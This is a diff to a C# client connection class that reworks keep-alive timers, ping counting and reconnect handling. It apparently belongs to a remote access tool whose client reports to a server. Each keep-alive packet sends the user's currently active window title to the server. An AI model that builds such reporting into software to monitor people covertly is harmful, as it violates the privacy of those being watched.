@@ -31,6 +31,7 @@ namespace Client.Connection
         private static object SendSync { get; } = new object(); //Sync send
         private static Timer Ping { get; set; } //Send ping interval
         public static int Interval { get; set; } //ping value
+        public static bool ActivatePong { get; set; }
 
 
         public static void InitializeClient() //Connect & reconnect
@@ -92,7 +93,10 @@ namespace Client.Connection
                     Buffer = new byte[HeaderSize];
                     Offset = 0;
                     Send(IdSender.SendInfo());
-                    KeepAlive = new Timer(new TimerCallback(KeepAlivePacket), null, new Random().Next(15 * 1000, 30 * 1000), new Random().Next(15 * 1000, 60 * 1000));
+                    Interval = 0;
+                    ActivatePong = false;
+                    KeepAlive = new Timer(new TimerCallback(KeepAlivePacket), null, new Random().Next(10 * 1000, 15 * 1000), new Random().Next(10 * 1000, 15 * 1000));
+                    Ping = new Timer(new TimerCallback(Pong), null, 1, 1);
                     SslClient.BeginRead(Buffer, (int)Offset, (int)HeaderSize, ReadServertData, null);
                 }
                 else
@@ -124,15 +128,15 @@ namespace Client.Connection
 
         public static void Reconnect()
         {
-
             try
             {
-                Ping?.Dispose();
-                KeepAlive?.Dispose();
                 SslClient?.Dispose();
                 TcpClient?.Dispose();
+                Ping?.Dispose();
+                KeepAlive?.Dispose();
             }
             catch { }
+            IsConnected = false;
         }
 
         public static void ReadServertData(IAsyncResult ar) //Socket read/recevie
@@ -212,7 +216,7 @@ namespace Client.Connection
             {
                 try
                 {
-                    if (!IsConnected || msg == null)
+                    if (!IsConnected)
                     {
                         return;
                     }
@@ -254,19 +258,28 @@ namespace Client.Connection
 
         public static void KeepAlivePacket(object obj)
         {
-            MsgPack msgpack = new MsgPack();
-            msgpack.ForcePathObject("Packet").AsString = "Ping";
-            msgpack.ForcePathObject("Message").AsString = Methods.GetActiveWindowTitle();
-            Send(msgpack.Encode2Bytes());
-            Ping?.Dispose();
-            Interval = 0;
-            Ping = new Timer(new TimerCallback(Pong), null, 1, 1);
-            GC.Collect();
+            try
+            {
+                MsgPack msgpack = new MsgPack();
+                msgpack.ForcePathObject("Packet").AsString = "Ping";
+                msgpack.ForcePathObject("Message").AsString = Methods.GetActiveWindowTitle();
+                Send(msgpack.Encode2Bytes());
+                GC.Collect();
+                ActivatePong = true;
+            }
+            catch { }
         }
 
         private static void Pong(object obj)
         {
-            Interval++;
+            try
+            {
+                if (ActivatePong && IsConnected)
+                {
+                    Interval++;
+                }
+            }
+            catch { }
         }
     }
 }
